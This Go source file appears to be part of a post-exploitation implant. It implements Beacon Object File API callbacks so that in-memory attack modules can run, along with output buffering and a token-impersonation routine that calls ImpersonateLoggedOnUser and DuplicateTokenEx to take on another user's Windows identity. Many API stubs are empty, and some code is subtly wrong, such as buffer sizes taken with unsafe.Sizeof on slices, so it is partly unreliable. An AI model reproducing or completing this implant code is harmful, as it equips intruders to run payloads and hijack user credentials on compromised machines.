package beacon

import (
	"bytes"
	"fmt"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
	"io/ioutil"
	"strings"
	"syscall"
	"unsafe"
)

var Glob_Token uintptr

// todo
func InternalFunctions(funcname string) (uintptr, bool) {
	var beaconfunc uintptr
	if strings.Contains(funcname, "BeaconOutput") {
		beaconfunc = syscall.NewCallback(BeaconOutput)
	} else if strings.Contains(funcname, "BeaconDataParse") {
		beaconfunc = syscall.NewCallback(BeaconDataParse)
	} else if strings.Contains(funcname, "BeaconDataInt") {

	} else if strings.Contains(funcname, "BeaconDataShort") {
		beaconfunc = syscall.NewCallback(BeaconDataShort)
	} else if strings.Contains(funcname, "BeaconDataLength") {

	} else if strings.Contains(funcname, "BeaconDataExtract") {
		beaconfunc = syscall.NewCallback(BeaconDataExtract)
	} else if strings.Contains(funcname, "BeaconFormatAlloc") {

	} else if strings.Contains(funcname, "BeaconFormatReset") {

	} else if strings.Contains(funcname, "BeaconFormatFree") {

	} else if strings.Contains(funcname, "BeaconFormatAppend") {

	} else if strings.Contains(funcname, "BeaconFormatPrintf") {

	} else if strings.Contains(funcname, "BeaconFormatToString") {

	} else if strings.Contains(funcname, "BeaconFormatInt") {

	} else if strings.Contains(funcname, "BeaconPrintf") {
		beaconfunc = syscall.NewCallback(BeaconPrintf)
	} else if strings.Contains(funcname, "BeaconOutput") {

	} else if strings.Contains(funcname, "BeaconUseToken") {
		beaconfunc = syscall.NewCallback(BeaconUseToken)
	} else if strings.Contains(funcname, "BeaconRevertToken") {

	} else if strings.Contains(funcname, "BeaconIsAdmin") {

	} else if strings.Contains(funcname, "BeaconGetSpawnTo") {

	} else if strings.Contains(funcname, "BeaconSpawnTemporaryProcess") {

	} else if strings.Contains(funcname, "BeaconInjectProcess") {

	} else if strings.Contains(funcname, "BeaconInjectTemporaryProcess") {

	} else if strings.Contains(funcname, "BeaconCleanupProcess") {

	} else if strings.Contains(funcname, "toWideChar") {

	} else if strings.Contains(funcname, "LoadLibraryA") {
		beaconfunc = syscall.NewLazyDLL("kernel32").NewProc("LoadLibraryA").Addr()
	} else if strings.Contains(funcname, "GetProcAddress") {
		beaconfunc = syscall.NewLazyDLL("kernel32").NewProc("GetProcAddress").Addr()
	} else if strings.Contains(funcname, "GetModuleHandleA") {
		beaconfunc = syscall.NewLazyDLL("kernel32").NewProc("GetModuleHandleA").Addr()
	} else if strings.Contains(funcname, "FreeLibrary") {
		beaconfunc = syscall.NewLazyDLL("kernel32").NewProc("FreeLibrary").Addr()
	}
	if beaconfunc != 0 {
		return uintptr(beaconfunc), true
	} else {
		return 0, false
	}
}

var beaconCompatibilityOutput []byte
var beaconCompatibilitySize int
var beaconCompatibilityOffset int

var (
	advapi32                    = syscall.NewLazyDLL("advapi32.dll")
	procImpersonateLoggedOnUser = advapi32.NewProc("ImpersonateLoggedOnUser")
)

func impersonateLoggedOnUser(token uintptr) bool {
	r1, _, _ := procImpersonateLoggedOnUser.Call(token)
	if r1 == 0 {
		return false
	}
	return true
}

var (
	procGetTokenInformation = advapi32.NewProc("GetTokenInformation")
	procLookupAccountSid    = advapi32.NewProc("LookupAccountSidA")
)

// TokenUser struct
type TOKEN_USER struct {
	User syscall.SIDAndAttributes
}

func getTokenUsername(token uintptr) bool {
	// 定义变量
	var TokenUserInfo TOKEN_USER
	var returned_tokinfo_length uint32
	username_only := make([]byte, 256)
	domainname_only := make([]byte, 256)
	var usernameSize = uint32(unsafe.Sizeof(username_only))
	var domainSize = uint32(unsafe.Sizeof(domainname_only))
	var sidType uint32

	// 调用GetTokenInformation
	success, _, _ := procGetTokenInformation.Call(
		token,
		uintptr(syscall.TokenUser), // TokenUser
		uintptr(unsafe.Pointer(&TokenUserInfo)),
		4096,
		uintptr(unsafe.Pointer(&returned_tokinfo_length)))
	if success == 0 {
		return false
	}

	// 调用LookupAccountSid
	success, _, _ = procLookupAccountSid.Call(
		0,
		uintptr(unsafe.Pointer(TokenUserInfo.User.Sid)),
		uintptr(unsafe.Pointer(&username_only[0])),
		uintptr(unsafe.Pointer(&usernameSize)),
		uintptr(unsafe.Pointer(&domainname_only[0])),
		uintptr(unsafe.Pointer(&domainSize)),
		uintptr(unsafe.Pointer(&sidType)))
	if success == 0 {
		return false
	}

	fmt.Printf("%s\\%s\n", string(domainname_only[:domainSize]), string(username_only[:usernameSize]))

	return true
}

func BeaconUseToken(token uintptr) uintptr {
	if Glob_Token != 0 {
		syscall.CloseHandle(syscall.Handle(Glob_Token))
	}
	Glob_Token = 0

	modadvapi32 := syscall.NewLazyDLL("advapi32.dll")
	procRevertToSelf := modadvapi32.NewProc("RevertToSelf")
	procRevertToSelf.Call()

	if !impersonateLoggedOnUser(token) {
		return 0
	}

	DuplicateTokenEx := syscall.NewLazyDLL("Advapi32.dll").NewProc("DuplicateTokenEx")
	DuplicateTokenEx.Call(token, 0x02000000, 0, 3, 1, uintptr(unsafe.Pointer(&Glob_Token)))
	if Glob_Token == 0 {
		return 0
	}
	if !impersonateLoggedOnUser(Glob_Token) {
		return 0
	}
	if !getTokenUsername(Glob_Token) {
		return 0
	}
	return 1
}

func BeaconDataShort(parserPtr uintptr) uintptr {
	parser := (*Datap)(unsafe.Pointer(parserPtr))
	if parser.length < 2 {
		return 0
	}

	var retvalue int16
	Memcpy(parser.buffer, uintptr(unsafe.Pointer(&retvalue)), 2)
	parser.buffer += 2
	parser.length -= 2
	return uintptr(retvalue)
}

func byteSliceToString(bval []byte) string {
	for i := range bval {
		if bval[i] == 0 {
			return string(bval[:i])
		}
	}
	return string(bval[:])
}

func BytePtrToString(r uintptr) string {
	if r == 0 {
		return ""
	}
	if r == 0xffffffff {
		return ""
	}
	if r == 0x1 {
		return ""
	}
	bval := (*[1 << 30]byte)(unsafe.Pointer(r))
	return byteSliceToString(bval[:])
}

// 未能实现可变参数,仅支持4参数以内
func BeaconPrintf(t int, ptr uintptr, a uintptr, b uintptr) uintptr {
	var length int
	bufstr := BytePtrToString((uintptr)(unsafe.Pointer(ptr)))

	a1 := BytePtrToString((uintptr)(unsafe.Pointer(a)))

	b1 := BytePtrToString((uintptr)(unsafe.Pointer(b)))

	bufstr = fmt.Sprintf(bufstr, a1, b1)

	length = len(bufstr)
	data := make([]byte, length)

	Memcpy(uintptr(unsafe.Pointer(&([]byte(bufstr))[0])), uintptr(unsafe.Pointer(&data[0])), uintptr(length))
	beaconCompatibilityOutput = append(beaconCompatibilityOutput, make([]byte, length)...)
	copy(beaconCompatibilityOutput[beaconCompatibilityOffset:], data[:length])
	beaconCompatibilitySize += length
	beaconCompatibilityOffset += length
	return 0

}

type Datap struct {
	original uintptr // the original buffer [so we can free it]
	buffer   uintptr // current pointer into our buffer
	length   int     // remaining of data
	size     int     // total size of this buffer
}

func BeaconDataParse(parserPtr uintptr, buffer uintptr, size int) uintptr {
	parser := (*Datap)(unsafe.Pointer(parserPtr))
	if parser == nil {
		return 0
	}
	parser.original = buffer
	parser.buffer = buffer
	parser.length = size - 4
	parser.size = size - 4
	parser.buffer += 4
	return 0
}

func BeaconDataExtract(parserPtr uintptr, size *int) uintptr {
	length := 0
	parser := (*Datap)(unsafe.Pointer(parserPtr))

	if parser.length < 4 {
		return 0
	}

	Memcpy(parser.buffer, uintptr(unsafe.Pointer(&length)), 4)
	parser.buffer += 4

	outdata := parser.buffer
	if outdata == 0 {
		return 0
	}
	parser.length -= 4
	parser.length -= length
	parser.buffer += uintptr(length)

	if uintptr(unsafe.Pointer(size)) != 0 && outdata != 0 {
		*size = int(length)
	}

	return outdata
}

func Memcpy(src, dst, size uintptr) {
	for i := uintptr(0); i < size; i++ {
		*(*byte)(unsafe.Pointer(dst + i)) = *(*byte)(unsafe.Pointer(src + i))
	}
}

func BeaconOutput(outputType int, d uintptr, length int) uintptr {
	data := make([]byte, length)
	Memcpy(d, uintptr(unsafe.Pointer(&data[0])), uintptr(length))
	beaconCompatibilityOutput = append(beaconCompatibilityOutput, make([]byte, length)...)
	copy(beaconCompatibilityOutput[beaconCompatibilityOffset:], data[:length])
	beaconCompatibilitySize += length
	beaconCompatibilityOffset += length
	return 0
}

func GbkToUtf8(s []byte) ([]byte, error) {
	reader := transform.NewReader(bytes.NewReader(s), simplifiedchinese.GBK.NewDecoder())
	d, e := ioutil.ReadAll(reader)
	if e != nil {
		return nil, e
	}
	return d, nil
}

func BeaconGetOutputData(outsize *int) string {
	outdata := string(beaconCompatibilityOutput)
	*outsize = beaconCompatibilitySize
	beaconCompatibilityOutput = nil
	beaconCompatibilitySize = 0
	beaconCompatibilityOffset = 0
	return outdata
}
